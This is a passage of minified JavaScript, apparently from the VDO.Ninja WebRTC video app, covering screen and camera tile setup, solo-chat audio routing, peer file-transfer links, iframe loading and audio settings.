v.container=container,container.id="container_screen",container.style.height="100%",session.cleanOutput&&(v.style.maxWidth="100%",v.style.boxShadow="none"),getById("gridlayout").appendChild(container),session.nopreview&&(v.style.display="none",container.style.display="none"),container.appendChild(v),v.className="tile",session.director||(!1!==session.scene?setTimeout((function(){updateMixer()}),1):!1!==session.roomid?""===session.roomid?session.view&&""!==session.view?(play(),setTimeout((function(){updateMixer()}),1)):(getById("mutespeakerbutton").classList.add("hidden"),session.fullscreen?(session.windowed=!1,session.mirrored&&session.flipped?(v.style.transform=" scaleX(-1) scaleY(-1)",v.classList.add("mirrorControl")):session.mirrored?(v.style.transform="scaleX(-1)",v.classList.add("mirrorControl")):session.flipped?(v.style.transform="scaleY(-1)",v.classList.remove("mirrorControl")):(v.style.transform="",v.classList.remove("mirrorControl"))):(v.className="myVideo",session.windowed=!0,session.mirrored&&session.flipped?(v.style.transform=" scaleX(-1) scaleY(-1) translate(0, 50%)",v.classList.add("mirrorControl")):session.mirrored?(v.style.transform="scaleX(-1) translate(0, -50%)",v.classList.add("mirrorControl")):session.flipped?(v.style.transform="scaleY(-1) translate(0, 50%)",v.classList.remove("mirrorControl")):(v.style.transform=" translate(0, -50%)",v.classList.remove("mirrorControl"))),container.style.width="100%",container.style.alignItems="center",container.backgroundColor="#666",setTimeout((function(){dragElement(v)}),1e3),play()):setTimeout((function(){updateMixer()}),1):(getById("mutespeakerbutton").classList.add("hidden"),session.fullscreen?(session.windowed=!1,session.mirrored&&session.flipped?(v.style.transform=" scaleX(-1) scaleY(-1)",v.classList.add("mirrorControl")):session.mirrored?(v.style.transform="scaleX(-1)",v.classList.add("mirrorControl")):session.flipped?(v.style.transform="scaleY(-1)",v.classList.remove("mirrorControl")):(v.style.transform="",v.classList.remove("mirrorControl"))):(v.className="myVideo",session.windowed=!0,container.classList.add("vidcon"),session.mirrored&&session.flipped?(v.style.transform=" scaleX(-1) scaleY(-1) translate(0, 50%)",v.classList.add("mirrorControl")):session.mirrored?(v.style.transform="scaleX(-1) translate(0, -50%)",v.classList.add("mirrorControl")):session.flipped?(v.style.transform="scaleY(-1) translate(0, 50%)",v.classList.remove("mirrorControl")):(v.style.transform=" translate(0, -50%)",v.classList.remove("mirrorControl"))),container.style.width="100%",container.style.alignItems="center",container.backgroundColor="#666")),session.windowed||(window.onresize=updateMixer,window.onorientationchange=function(){Firefox&&updateForceRotate(!0),setTimeout((async function(){session.forceAspectRatio&&await updateCameraConstraints("aspectRatio",session.forceAspectRatio),session.effect&&"7"===session.effect&&digitalZoom(!0),updateForceRotate(),updateMixer()}),200)}),v.autoplay=!0,v.controls=session.showControls||!1,v.setAttribute("playsinline",""),v.muted=!0,v.id="videosource",v.dataset.menu="context-menu-video",session.cleanOutput||v.classList.add("task"),v.srcObject=outboundAudioPipeline(),v.onpause=event=>{event.ctrlKey||event.metaKey||(log("Video paused; auto playing"),event.currentTarget.play().then((_=>{log("playing 11")})).catch(warnlog))},v.addEventListener("click",(function(e){log("click");try{if(e.ctrlKey||e.metaKey){e.preventDefault();var[menu,innerMenu]=statsMenuCreator();return menu.interval=setInterval(printMyStats,session.statsInterval,innerMenu),printMyStats(innerMenu),e.stopPropagation(),!1}}catch(e){errorlog(e)}})),updateReshareLink(),session.videoMutedFlag&&(session.videoMuted=!0,toggleVideoMute(!0)),clearInterval(session.updateLocalStatsInterval),session.updateLocalStatsInterval=setInterval((function(){updateLocalStats()}),session.statsInterval),session.seeding=!0,session.seedStream(),pokeIframeAPI("screen-share-state",!0,null,session.streamID),(session.autorecord||session.autorecordlocal)&&(log("AUTO RECORD START"),setTimeout((function(v){var videoKbps=4e3;!1!==session.recordLocal&&(videoKbps=session.recordLocal),session.director?recordVideo(document.querySelector("[data-action-type='recorder-local'][data-sid='"+session.streamID+"']"),null,videoKbps):v.stopWriter||v.recording||(v.startWriter?v.startWriter():recordLocalVideo(null,videoKbps,v))}),2e3,v)),!0})).catch((function(err){return errorlog(err),errorlog(err.name),"NotAllowedError"==err.name||"PermissionDeniedError"==err.name?(session.screenShareState=!1,pokeIframeAPI("screen-share-state",session.screenShareState,null,session.streamID),notifyOfScreenShare(),macOS&&warnUser(getTranslation("screen-permissions-denied"),!1,!1),!1):1==audio?"NotReadableError"==err.name?(session.cleanOutput||warnUser(getTranslation("change-audio-output-device"),!1,!1),!1):(constraints.audio=!1,session.cleanOutput||setTimeout((function(){warnUser(err)}),1),publishScreen2(constraints,audioList,!1)):(session.cleanOutput||setTimeout((function(){warnUser(err)}),1),!1)}))}session.applySoloChat=function(apply=!0){if(!1!==session.director){if(session.directorEnabledPPT){log("applySoloChat()");for(var i=session.soloChatUUID.length;i--;)session.soloChatUUID[i]in session.pcs||(session.soloChatUUID.splice(i,1),log("splicing out: "+i));for(var uuid in session.pcs)try{getSenders2(uuid).forEach((sender=>{if(sender.track&&"audio"===sender.track.kind){var settings={};session.soloChatUUID.length&&session.soloChatUUID.includes(uuid)?(settings.active=!0,setEncodings(sender,settings,(function(uid){log("2: "+uid);try{document.querySelectorAll('[data-action-type="solo-chat"][data--u-u-i-d="'+uid+'"]')[0].classList.add("pressed"),document.querySelectorAll('[data-action-type="solo-chat"][data--u-u-i-d="'+uid+'"]')[0].ariaPressed="true",document.querySelectorAll('[data-action-type="solo-chat"][data--u-u-i-d="'+uid+'"]')[0].classList.remove("hint")}catch(e){warnlog(e)}}),uuid)):0==session.soloChatUUID.length?(settings.active=!0,setEncodings(sender,settings,(function(uid){log(uid);try{document.querySelectorAll('[data-action-type="solo-chat"][data--u-u-i-d="'+uid+'"]')[0].classList.remove("pressed"),document.querySelectorAll('[data-action-type="solo-chat"][data--u-u-i-d="'+uid+'"]')[0].ariaPressed="false",document.querySelectorAll('[data-action-type="solo-chat"][data--u-u-i-d="'+uid+'"]')[0].classList.remove("hint")}catch(e){warnlog(e)}}),uuid)):(settings.active=!1,setEncodings(sender,settings,(function(uid){warnlog("muted the output to:"+uid);try{document.querySelectorAll('[data-action-type="solo-chat"][data--u-u-i-d="'+uid+'"]')[0].classList.remove("pressed"),document.querySelectorAll('[data-action-type="solo-chat"][data--u-u-i-d="'+uid+'"]')[0].ariaPressed="false",document.querySelectorAll('[data-action-type="solo-chat"][data--u-u-i-d="'+uid+'"]')[0].classList.add("hint")}catch(e){warnlog(e)}}),uuid))}}))}catch(e){errorlog(e)}if(0==apply){if(session.soloChatUUID.length){session.muted_savedState=session.muted,session.muted=!1,data={},data.muteState=session.muted;for(i=0;i<session.soloChatUUID.length;i++)session.sendMessage(data,session.soloChatUUID[i])}else session.muted=session.muted_savedState;toggleMute(!0)}}}else session.applyIsolatedChat()},session.publishStream=function(v){log("STREAM SETUP"),session.transcript&&setTimeout((function(){setupClosedCaptions()}),1e3),session.streamSrc||checkBasicStreamsExist(),session.streamSrc.oninactive=function streamoninactive(){warnlog("Stream inactive"),session.videoElement.recording&&session.videoElement.recorder.stop()},0==session.streamSrc.getVideoTracks().length&&warnlog("NO VIDEO TRACK INCLUDED"),0==session.streamSrc.getAudioTracks().length&&warnlog("NO AUDIO TRACK INCLUDED");var container=document.createElement("div");if(v.container=container,container.id="container",session.cleanOutput&&(container.style.height="100%",v.style.maxWidth="100%",v.style.boxShadow="none"),session.cover&&container.style.setProperty("height","100%","important"),getById("gridlayout").appendChild(container),v.className="tile",v.muted=!0,v.autoplay=!0,null!==session.showControls?v.controls=session.showControls:session.mobile?v.controls=!0:v.controls=session.showControls||!1,v.setAttribute("playsinline",""),v.id="videosource",v.oncanplay=null,session.videoElement=v,container.appendChild(v),!1!==session.audioGain&&changeMainGain(session.audioGain),toggleMute(!0),session.nopreview&&(v.style.display="none",container.style.display="none"),(!1===session.roomid||""===session.roomid)&&!1===session.quality||session.forceMediaSettings)try{!1!==session.quality_wb&&!1===session.quality?getById("webcamquality3").elements.namedItem("resolution").value=session.quality_wb:!1!==session.quality&&(getById("webcamquality3").elements.namedItem("resolution").value=session.quality),getById("gear_webcam3").style.display="inline-block",getById("webcamquality3").onchange=function(event){2==parseInt(getById("webcamquality3").elements.namedItem("resolution").value)?!1===session.maxframeRate&&(session.maxframeRate=30,session.maxframeRate_q2=!0):session.maxframeRate_q2&&(session.maxframeRate=!1,session.maxframeRate_q2=!1),activatedPreview=!1,session.quality_wb=parseInt(getById("webcamquality3").elements.namedItem("resolution").value),grabVideo(session.quality_wb,"videosource","select#videoSource3")}}catch(e){errorlog(e)}var bigPlayButton=document.getElementById("bigPlayButton");if(bigPlayButton&&bigPlayButton.parentNode.removeChild(bigPlayButton),session.streamID&&(session.videoElement.dataset.sid=session.streamID),session.statsMenu){var[menu,innerMenu]=statsMenuCreator();menu.interval=setInterval(printMyStats,session.statsInterval,innerMenu),printMyStats(innerMenu)}session.director||!1!==session.scene||(!1!==session.roomid?""===session.roomid?session.view&&""!==session.view?(session.windowed=!1,applyMirror(session.mirrorExclude),play()):(session.fullscreen?session.windowed=!1:(v.className="myVideo",session.windowed=!0,container.classList.add("vidcon")),getById("mutespeakerbutton").classList.add("hidden"),applyMirror(session.mirrorExclude),container.style.width="100%",container.style.alignItems="center",container.backgroundColor="#666",setTimeout((function(){dragElement(v)}),1e3),play()):(5==session.stereo&&(session.stereo=3),session.windowed=!1,applyMirror(session.mirrorExclude),session.include.length&&play()):(session.fullscreen?session.windowed=!1:(v.className="myVideo",container.classList.add("vidcon"),session.windowed=!0),getById("mutespeakerbutton").classList.add("hidden"),applyMirror(session.mirrorExclude),container.style.width="100%",container.style.alignItems="center",container.backgroundColor="#666",setTimeout((function(){dragElement(v)}),1e3))),v.addEventListener("click",(function(e){log("click");try{if(e.ctrlKey||e.metaKey){e.preventDefault();var[menu,innerMenu]=statsMenuCreator();return menu.interval=setInterval(printMyStats,session.statsInterval,innerMenu),printMyStats(innerMenu),e.stopPropagation(),!1}}catch(e){errorlog(e)}})),v.touchTimeOut=null,v.touchLastTap=0,v.touchCount=0,v.addEventListener("touchend",(function(event){if(!session.disableMouseEvents){log("touched"),document.onmousemove=null,document.ontouchmove=null;var currentTime=(new Date).getTime(),tapLength=currentTime-v.touchLastTap;if(clearTimeout(v.touchTimeOut),tapLength<500&&tapLength>0){if(log("double touched"),v.touchCount+=1,event.preventDefault(),v.touchCount<5)return v.touchLastTap=currentTime,!1;v.touchLastTap=0,v.touchCount=0;var[menu,innerMenu]=statsMenuCreator();return menu.interval=setInterval(printMyStats,session.statsInterval,innerMenu),printMyStats(innerMenu),event.stopPropagation(),!1}v.touchCount=1,v.touchLastTap=currentTime,v.touchTimeOut=setTimeout((function(vv){clearTimeout(vv.touchTimeOut),vv.touchLastTap=0,vv.touchCount=0}),5e3,v)}})),updateReshareLink(),pokeIframeAPI("started-camera"),pokeIframeAPI("camera-share",!0),session.videoMutedFlag&&(session.videoMuted=!0,toggleVideoMute(!0)),gotDevices2AlreadyRan||enumerateDevices().then(gotDevices2),v.dataset.menu="context-menu-video",session.cleanOutput||v.classList.add("task"),session.postPublish(),(session.autorecord||session.autorecordlocal)&&(log("AUTO RECORD START"),setTimeout((function(v){var videoKbps=4e3;!1!==session.recordLocal&&(videoKbps=session.recordLocal),session.director?recordVideo(document.querySelector("[data-action-type='recorder-local'][data-sid='"+session.streamID+"']"),null,videoKbps):v.stopWriter||v.recording||(v.startWriter?v.startWriter():recordLocalVideo(null,videoKbps,v))}),2e3,v)),setTimeout((function(){updateMixer()}),10)},session.postPublish=async function(){if(log("Post publish"),session.welcomeMessage?stickyMessage(session.welcomeMessage):!session.queue||3!=session.queueType&&4!=session.queueType||session.director||youreWaitingToBeActivated(),session.welcomeImage){var welcomeoverlay=document.createElement("img");welcomeoverlay.src=session.welcomeImage,welcomeoverlay.className="welcomeOverlay",document.body.appendChild(welcomeoverlay),await sleep(2e3),setTimeout((function(welcomeoverlay){welcomeoverlay.style="animation: fadeout 1s;",setTimeout((function(welcomeoverlay){welcomeoverlay.remove()}),990,welcomeoverlay)}),1e3,welcomeoverlay)}if(session.welcomeHTML){var welcomeHTML=document.createElement("div");welcomeHTML.innerHTML=session.welcomeHTML,welcomeHTML.className="welcomeOverlay",document.body.appendChild(welcomeHTML),setTimeout((function(welcomeHTML){welcomeHTML.style="animation: fadeout 1s;",setTimeout((function(welcomeHTML){welcomeHTML.remove()}),990,welcomeHTML)}),3e3,welcomeHTML)}clearInterval(session.updateLocalStatsInterval),session.updateLocalStatsInterval=setInterval((function(){updateLocalStats()}),session.statsInterval),pokeIframeAPI("screen-share-state",!1),session.seeding=!0,session.seedStream(),session.motionRecord&&session.videoElement&&!session.motionDetectionInterval&&(session.motionDetectionInterval=setTimeout((function(){setInterval((function(){motionDetection(session.videoElement,session.motionRecord)}),400)}),2e3))};var transferList=[],msgTransferList=[];function cancelFile(ele){var idx=ele.dataset.tid;try{transferList[idx].dc.close()}catch(e){}transferList[idx].status=5,updateDownloadLink(idx)}function requestFile(ele){var idx=ele.dataset.tid;transferList[idx].status=1;var fid=ele.dataset.fid,UUID=ele.dataset.uuid,msg={};msg.requestFile=fid,msg.UUID=UUID,session.sendRequest(msg,msg.UUID),updateDownloadLink(idx),pokeIframeAPI("request-file",fid,UUID)}function clearDownloadFile(ele){var idx=ele.dataset.tid;transferList[idx].status=6,updateDownloadLink(idx)}function addDownloadLink(fileList,UUID,pc){if(!session.nodownloads&&(log(fileList),fileList&&fileList.length)){for(var i=0;i<fileList.length;i++)fileList[i].UUID=UUID,fileList[i].completed=0,fileList[i].status=0,fileList[i].time=Date.now(),fileList[i].pc=pc[UUID],transferList.push(fileList[i]);!1!==session.chatbutton&&(updateMessages(),session.beepToNotify&&playtone(),0==session.chat&&(getById("chattoggle").className="las la-comments toggleSize pulsate",getById("chatbutton").className="float",getById("chatNotification").value?getById("chatNotification").value=getById("chatNotification").value+1:getById("chatNotification").value=1,getById("chatNotification").classList.add("notification","red")))}}function updateDownloadLink(idx){idx=parseInt(idx);var elements=document.querySelectorAll('[data-tid="'+idx+'"]');elements[0]&&(0===transferList[idx].status?elements[0].innerHTML="Download it here":1===transferList[idx].status?elements[0].innerHTML="Requested":2===transferList[idx].status?(elements[0].innerHTML="Downloading: "+parseInt(100*transferList[idx].completed)+"%",elements[0].onclick=function(){cancelFile(this)}):3===transferList[idx].status?(elements[0].innerHTML="Completed",elements[0].onclick=null,elements[0].disabled=!0):4===transferList[idx].status?(elements[0].innerHTML="No longer available",elements[0].onclick=null,elements[0].disabled=!0):5===transferList[idx].status?(elements[0].innerHTML="Cancelled",elements[0].onclick=null,elements[0].disabled=!0):6===transferList[idx].status&&(getById("transfer_"+idx).style.display="none"))}function showDownloadLinks(){if(!session.nodownloads&&(msgTransferList=[],transferList&&transferList.length))for(var i=0;i<transferList.length;i++)fileShareMessage(transferList[i],i)}function fileShareMessage(fileinfo,idx){fileinfo.name=sanitizeChat(fileinfo.name);var label=!1;fileinfo.pc&&fileinfo.pc.label&&(label=sanitizeLabel(fileinfo.pc.label));var data={};if(data.idx=idx,0===fileinfo.status)data.msg=" has a shared a file with you:<br /><i>"+fileinfo.name+"</i><br />Do you trust them? <button title='file size: "+fileinfo.size+" bytes' data-button-type='download' data-fid='"+fileinfo.id+"' data-tid='"+idx+"' onclick='requestFile(this);'>Download it here</button><button data-button-type='clear' data-fid='"+fileinfo.id+"' data-tid='"+idx+"' style='margin:10px 0 10px 2px;' onclick='clearDownloadFile(this);'>Clear</button>";else if(1===fileinfo.status)data.msg=" has a shared a file with you:<br /><i>"+fileinfo.name+"</i><br /><button title='file size: "+fileinfo.size+" bytes' data-button-type='download' data-fid='"+fileinfo.id+"' data-tid='"+idx+"'>Requested</button>";else if(2===fileinfo.status)data.msg=" has a shared a file with you:<br /><i>"+fileinfo.name+"</i><br /><button title='file size: "+fileinfo.size+" bytes' data-button-type='download' data-fid='"+fileinfo.id+"' data-tid='"+idx+"' onclick='cancelFile(this);'>Downloading: "+parseInt(100*transferList[idx].completed)+"%</button>";else if(3===fileinfo.status)data.msg=" has a shared a file with you:<br /><i>"+fileinfo.name+"</i><br /><button disabled title='file size: "+fileinfo.size+" bytes' data-button-type='download' data-fid='"+fileinfo.id+"' data-tid='"+idx+"' >Download Completed</button>",transferList[idx].status=6;else if(4===fileinfo.status)data.msg=" has a shared a file with you:<br /><i>"+fileinfo.name+"</i><br /><button title='file size: "+fileinfo.size+" bytes' data-button-type='download' data-fid='"+fileinfo.id+"' data-tid='"+idx+"' disabled >No longer available</button>";else if(5===fileinfo.status)data.msg=" has a shared a file with you:<br /><i>"+fileinfo.name+"</i><br /><button title='file size: "+fileinfo.size+" bytes' data-button-type='download' data-fid='"+fileinfo.id+"' data-tid='"+idx+"' disabled >Cancelled</button>",transferList[idx].status=6;else if(6===fileinfo.status)return;var director=!1;session.directorList.indexOf(fileinfo.UUID)>=0&&(director=!0),label?(data.label=label,data.label=director?"<b><i>"+data.label+"</i></b>":"<b>"+data.label+"</b>"):data.label=director?"<b><i>Director</i></b>":"Someone",data.type="action",msgTransferList.push(data)}function updateReshareLink(){try{getById("mainmenu").remove(),document.querySelectorAll(".hidden2").forEach((ele2=>{ele2.classList.remove("hidden2")}))}catch(e){}var added="";!1===session.defaultPassword&&(added=!1!==session.password?"&pw="+session.password:"&pw=false");var wss="";session.wssSetViaUrl&&(wss=session.customWSS&&!0!==session.customWSS?"&pie="+session.customWSS:"&wss="+session.wss);var shareLink="https://"+location.host+location.pathname+"?view="+session.streamID+added+wss;document.getElementById("reshare")&&(document.getElementById("reshare").href=shareLink,document.getElementById("reshare").text=shareLink,document.getElementById("reshare").style.width=1.15*(document.getElementById("reshare").text.length+1)*8+"px"),pokeIframeAPI("share-link",shareLink)}function nextFilePlaylist(vid){log("nextFilePlaylistD");var filenext=vid.playlist.shift();vid.pause(),vid.removeAttribute("src"),vid.src=URL.createObjectURL(filenext),vid.onloadeddata=function(){var tracks;session.streamSrc=Firefox?vid.mozCaptureStream():vid.captureStream(),(tracks=session.streamSrc.getVideoTracks()).length&&pushOutVideoTrack(tracks[0]),senderAudioUpdate(!1,tracks=session.streamSrc.getAudioTracks())},session.applySoloChat(),session.applyIsolatedChat(),vid.load(),vid.play().then((_=>{log("playing 2")})).catch(warnlog)}function tryAgain(event){log("TRY AGAIN TRIGGERED"),warnlog(event)}function enterPressedClick(event,ele){13===event.keyCode&&(event.preventDefault(),ele.click())}function enterPressed(event,callback){13===event.keyCode&&(event.preventDefault(),callback())}function dragElement(elmnt){if(!session.disableMouseEvents){log("dragElement started");try{var stream=elmnt.srcObject;try{var track0=stream.getVideoTracks()}catch(e){return}if(!track0.length)return;var focusable=!1,zoomable=!1,dragged=!1,input=getById("zoomSlider");if((track0=track0[0]).getCapabilities){var capabilities=track0.getCapabilities(),settings=track0.getSettings();"focusDistance"in capabilities&&(log("focusable"),focusable=!0),"zoom"in capabilities&&capabilities.zoom.min!==capabilities.zoom.max&&(log("zoomable;"),zoomable=!0,input.min=capabilities.zoom.min,input.max=capabilities.zoom.max,input.step=capabilities.zoom.step,input.value=settings.zoom)}var millis=Date.now(),pos3=0,pos4=0,pos2=0}catch(e){return void errorlog(e)}(focusable||zoomable)&&(log("drag on"),elmnt.onmousedown=dragMouseDown,elmnt.ontouchstart=dragMouseDown)}function elementDrag(e){if((e=e||window.event).preventDefault(),log("dragging"),log(e),!(Date.now()-millis<100)){if(dragged=!0,millis=Date.now(),"touchstart"==e.type||"touchmove"==e.type||"touchend"==e.type||"touchcancel"==e.type){var touch=e.touches[0]||e.originalEvent.touches[0]||e.originalEvent.changedTouches[0];touch.clientX,pos2=touch.clientY}else"mousedown"!=e.type&&"mouseup"!=e.type&&"mousemove"!=e.type&&"mouseover"!=e.type&&"mouseout"!=e.type&&"mouseenter"!=e.type&&"mouseleave"!=e.type||(e.clientX,pos2=e.clientY);if(zoomable){var zoom=parseFloat(2*(pos4-pos2)/elmnt.offsetHeight);zoom>1?zoom=1:zoom<-1&&(zoom=-1),input.value=zoom*(input.max-input.min)+input.min,updateCameraConstraints("zoom",input.value,!1,!1)}}}function closeDragElement(e){log("closeDragElement"),log(e),dragged||(log("dragged: "+dragged),function onvideoclick(){return log("onvideoclick"),log(pos3+" "+pos4),tapToFocus(parseInt(100*pos3/elmnt.clientWidth),parseInt(pos4/elmnt.clientHeight*100)),!1}()),dragged=!1,elmnt.removeEventListener("touchend",closeDragElement),elmnt.removeEventListener("mouseup",closeDragElement),document.onmousemove=null,document.ontouchmove=null}function dragMouseDown(e){if(log("dragMouseDown"),log(e),dragged=!1,millis=Date.now(),(e=e||window.event).preventDefault(),input.value,"touchstart"==e.type||"touchmove"==e.type||"touchend"==e.type||"touchcancel"==e.type){var touch=e.touches[0]||e.originalEvent.touches[0]||e.originalEvent.changedTouches[0];pos3=touch.clientX,pos4=touch.clientY}else"mousedown"!=e.type&&"mouseup"!=e.type&&"mousemove"!=e.type&&"mouseover"!=e.type&&"mouseout"!=e.type&&"mouseenter"!=e.type&&"mouseleave"!=e.type||(pos3=e.clientX,pos4=e.clientY);elmnt.addEventListener("touchend",closeDragElement),elmnt.addEventListener("mouseup",closeDragElement),document.ontouchmove=elementDrag,document.onmousemove=elementDrag}}function previewIframe(iframeSrc){var iframe=document.createElement("iframe");iframe.allow="autoplay;camera;microphone;fullscreen;picture-in-picture;display-capture;midi;",iframe.style.width="100%",iframe.style.height="100%",iframe.style.border="10px dashed rgb(64 65 62)",iframeSrc=parseURL4Iframe(iframeSrc),iframe.src=iframeSrc,getById("previewIframe").innerHTML="",getById("previewIframe").style.width="640px",getById("previewIframe").style.height="360px",getById("previewIframe").style.margin="auto",getById("previewIframe").appendChild(iframe)}function loadIframe(iframesrc,UUID){var iframeID="iframe_"+UUID,iframe=document.createElement("iframe");if(iframe.allow="autoplay;camera;microphone;fullscreen;picture-in-picture;display-capture;midi;",iframe.style.width="100%",iframe.style.height="100%",iframe.style.border="10px dashed rgb(64 65 62)",iframe.id=iframeID,iframe.dataset.UUID=UUID,iframe.loadedYoutubeListen=!1,session.director||(!1!==session.scene?session.view||"0"===session.scene?iframe.style.display="block":iframe.style.display="none":!1!==session.roomid||(iframe.style.display="block")),""==iframesrc&&(iframesrc="./",iframe.style.border="0"),iframesrc.startsWith("https://vdo.ninja/"))iframe.style.border="0";else if(iframesrc.startsWith("https://obs.ninja/"))iframe.style.border="0";else if(iframesrc.startsWith("https://vmix.ninja/"))iframe.style.border="0";else if(iframesrc.startsWith("https://backup.vdo.ninja/"))iframe.style.border="0";else if(iframesrc.startsWith("https://backup.obs.ninja/"))iframe.style.border="0";else if(iframesrc.startsWith("https://www.youtube.com/"))iframe.style.border="0",setTimeout((function(iframe_id){YoutubeListen(iframe_id)}),1e3,iframeID);else if(iframesrc.startsWith("https://player.twitch.tv/"))iframe.style.border="0";else if(iframesrc.startsWith("https://twitch.tv/"))iframe.style.border="0";else if(iframesrc.startsWith("https://www.twitch.tv/"))iframe.style.border="0";else if(iframesrc.startsWith("https://vimeo.com/"))iframe.style.border="0";else if(iframesrc.startsWith("https://player.vimeo.com/"))iframe.style.border="0";else if(iframesrc.startsWith("https://meshcast.io/")){iframe.style.border="0";try{document.domain.endsWith(".vdo.ninja")&&(document.domain="vdo.ninja")}catch(e){errorlog(e)}}else(iframesrc.startsWith("https://s10.fun/")||iframesrc.startsWith("https://play.rozy.tv/"))&&(iframe.style.border="0");return iframe.src=iframesrc,pokeIframeAPI("iframe-loaded",iframesrc),iframe}function dropDownButtonAction(ele){(ele=getById("dropButton"))&&(ele.parentNode.removeChild(ele),document.querySelectorAll("div.column.card").forEach((child=>{child.classList.remove("hidden")})))}function updateConstraintSliders(){if(log("updateConstraintSliders"),!1!==session.roomid&&""!==session.roomid&&!0!==session.director&&0==session.forceMediaSettings)!1!==session.controlRoomBitrate&&listCameraSettings(),!1!==session.effect&&(getById("effectsDiv3").style.display="block",getById("effectSelector3").value=session.effect||"0");else if(listAudioSettings(),listCameraSettings(),!1!==session.effect){getById("effectsDiv3").style.display="block";try{getById("effectSelector3").value=session.effect||"0"}catch(E){}}}function checkIfPIP(){try{session.videoElement&&(session.videoElement.webkitSupportsPresentationMode&&"function"==typeof session.videoElement.webkitSetPresentationMode||document.pictureInPictureEnabled||!videoElement.disablePictureInPicture)&&(getById("pIpStartButton").addEventListener("click",(function(event){session.videoElement.webkitSetPresentationMode("picture-in-picture"===session.videoElement.webkitPresentationMode?"inline":"picture-in-picture")})),getById("pIpStartButton").style.display="inline-block")}catch(e){errorlog(e)}}function togglePictureInPicture(videoElement){if(document.pictureInPictureElement){if(document.pictureInPictureElement.id==videoElement.id)return document.exitPictureInPicture(),pokeIframeAPI("picture-in-picture",!1),!1;document.exitPictureInPicture(),pokeIframeAPI("picture-in-picture",!1),videoElement.requestPictureInPicture(),pokeIframeAPI("picture-in-picture",!0)}else document.pictureInPictureEnabled&&(videoElement.requestPictureInPicture(),pokeIframeAPI("picture-in-picture",!0));return!0}function mixMinusAudio(uid=!1){if(!1===session.stereo)var merger=session.audioCtx.createChannelMerger(1);else merger=session.audioCtx.createChannelMerger(2);if(session.videoElement&&session.videoElement.srcObject)for(var tracks=session.videoElement.srcObject.getAudioTracks(),i=0;i<tracks.length;i++)try{if((tempStream=createMediaStream()).addTrack(tracks[i]),trackStream=session.audioCtx.createMediaStreamSource(tempStream),!1!==session.stereo){var splitter=session.audioCtx.createChannelSplitter(2);trackStream.connect(splitter),splitter.connect(merger,0,0);try{splitter.connect(merger,1,1)}catch(e){errorlog(e);try{splitter.connect(merger,0,1)}catch(e){errorlog(e)}}}else trackStream.connect(merger,0,0)}catch(e){errorlog(e)}for(var UUID in session.rpcs)if((!uid||UUID!==uid)&&session.rpcs[UUID].videoElement&&session.rpcs[UUID].videoElement.srcObject)for(tracks=session.rpcs[UUID].videoElement.srcObject.getAudioTracks(),i=0;i<tracks.length;i++)try{var tempStream;if((tempStream=createMediaStream()).addTrack(tracks[i]),trackStream=session.audioCtx.createMediaStreamSource(tempStream),!1!==session.stereo){splitter=session.audioCtx.createChannelSplitter(2);trackStream.connect(splitter),splitter.connect(merger,0,0);try{splitter.connect(merger,1,1)}catch(e){errorlog(e);try{splitter.connect(merger,0,1)}catch(e){errorlog(e)}}}else trackStream.connect(merger,0,0)}catch(e){errorlog(e)}var destination=session.audioCtx.createMediaStreamDestination();return merger.connect(destination),destination.stream}function listAudioSettingsPrep(){try{var tracks=session.streamSrc.getAudioTracks();tracks.length||warnlog("session.streamSrc contains no audio tracks")}catch(e){return void warnlog(e)}for(var data=[],i=0;i<tracks.length;i+=1){track0=tracks[i];var trackSet={};if(track0.getCapabilities?trackSet.audioConstraints=track0.getCapabilities():Firefox&&(trackSet.audioConstraints={autoGainControl:[!0,!1],echoCancellation:[!0,!1],noiseSuppression:[!0,!1]}),track0.getSettings)if(trackSet.currentAudioConstraints=track0.getSettings(),session.stereo)session.audioInputChannels&&1==session.audioInputChannels&&(trackSet.currentAudioConstraints.channelCount=1);else try{delete trackSet.currentAudioConstraints.channelCount,delete trackSet.audioConstraints.channelCount}catch(e){}if(trackSet.trackLabel="unknown or none",track0.label&&(trackSet.trackLabel=track0.label),track0.id&&(trackSet.deviceId=track0.id),0==i)for(var waid in trackSet.equalizer=session.equalizer,session.webAudios){try{trackSet.lowEQ=session.webAudios[waid].lowEQ.gain.value,trackSet.midEQ=session.webAudios[waid].midEQ.gain.value,trackSet.highEQ=session.webAudios[waid].highEQ.gain.value}catch(e){}break}else trackSet.equalizer=!1;if(0==i){if(trackSet.lowcut=session.lowcut,session.lowcut)for(var waid in session.webAudios){try{trackSet.lowcut=session.webAudios[waid].lowcut1.frequency.value}catch(e){}break}}else trackSet.lowcut=!1;for(var waid in trackSet.subGain=!1,session.webAudios)try{session.webAudios[waid].subGainNodes&&track0.id in session.webAudios[waid].subGainNodes&&(trackSet.subGain=session.webAudios[waid].subGainNodes[track0.id].gain.value);break}catch(e){}0!=i||session.disableWebAudio||(trackSet.gating=session.noisegate,trackSet.compressor=session.compressor,trackSet.micDelay=session.micDelay),data.push(trackSet)}return pokeIframeAPI("listing-audio-settings",data),data}function listVideoSettingsPrep(){try{var track0=session.streamSrc.getVideoTracks();track0.length&&((track0=track0[0]).getCapabilities&&(session.cameraConstraints=track0.getCapabilities()),log(session.cameraConstraints))}catch(e){return void warnlog(e)}try{track0.getSettings&&(session.currentCameraConstraints=track0.getSettings(),screen&&screen.orientation&&screen.orientation.type?screen.orientation.type.includes("portrait")&&session.currentCameraConstraints&&session.currentCameraConstraints.aspectRatio&&(session.currentCameraConstraints.aspectRatio=1/session.currentCameraConstraints.aspectRatio):window.matchMedia("(orientation: portrait)").matches&&session.currentCameraConstraints&&session.currentCameraConstraints.aspectRatio&&(session.currentCameraConstraints.aspectRatio=1/session.currentCameraConstraints.aspectRatio))}catch(e){return void warnlog(e)}var msg={trackLabel:"unknown or none"};return track0.label&&(msg.trackLabel=track0.label),msg.currentCameraConstraints=session.currentCameraConstraints,msg.cameraConstraints=session.cameraConstraints,pokeIframeAPI("listing-video-settings",msg),msg}session.shareFile=function(ele,UUID=!1,event=!1){if(!1!==session.hostedFiles){for(var i=0;i<ele.files.length;i++)ele.files[i].id=session.generateStreamID(8),ele.files[i].state=1,ele.files[i].restricted=UUID,session.hostedFiles.push(ele.files[i]);if(log(session.hostedFiles),!1===UUID){for(UUID in session.pcs)session.provideFileList(UUID);for(UUID in session.rpcs)UUID in session.pcs||session.provideFileList(UUID)}else session.provideFileList(UUID);pokeIframeAPI("file-share",!0),closeModal()}},session.hostFile=function(ele,event){log("FILE TRANSFER SETUP"),session.hostedFiles=[];for(var i=0;i<ele.files.length;i++)ele.files[i].id=session.generateStreamID(8),ele.files[i].state=1,session.hostedFiles.push(ele.files[i]);log(session.hostedFiles);var 